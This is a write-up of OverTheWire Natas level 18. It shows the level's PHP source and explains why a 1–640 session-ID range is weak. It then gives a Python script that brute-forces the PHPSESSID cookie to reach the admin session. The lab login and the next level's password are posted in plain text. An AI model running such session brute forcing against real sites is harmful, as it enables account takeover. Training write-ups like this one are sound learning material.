This level focuses on PHP session management.
![[Pasted image 20260716140104.png]]

Entering `admin:admin` results:
![[Pasted image 20260716140128.png]]

There is a cookie called `PHPSESSID`:
![[Pasted image 20260716140214.png]]

Let's check the source code:
```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

```php
$maxid = 640;
```
We can assume that the `PHPSESSID` ranged from 1 to 640 which is pretty small.

```php
function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
```
This function is turned off since it's unsafe. So, we can't just login as admin.

We can write a script to brute force the `PHPSESSID` for the admin valid session ID:
```python
import httpx
import base64

url = "http://natas18.natas.labs.overthewire.org?debug"

b64_bytes = base64.b64encode("natas18:fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op".encode('utf-8'))
b64_string = b64_bytes.decode('utf-8')

headers = {
    "Authorization":f"Basic {b64_string}",
    "Content-Type":"application/x-www-form-urlencoded"
    }

for i in range(1,641):
    with httpx.Client() as client:
        client.cookies.set("PHPSESSID", f"{i}")
        response = client.get(url=url, headers=headers)

        print(f"Attempted session id: {i}")

        if "You are logged in as a regular user." not in response.text:
            print(f"Admin session id found: {i}")
            break
```
Lvl19 pass: qvwtMqAcVSBlf7HE3sw9pljhqqPF9MMT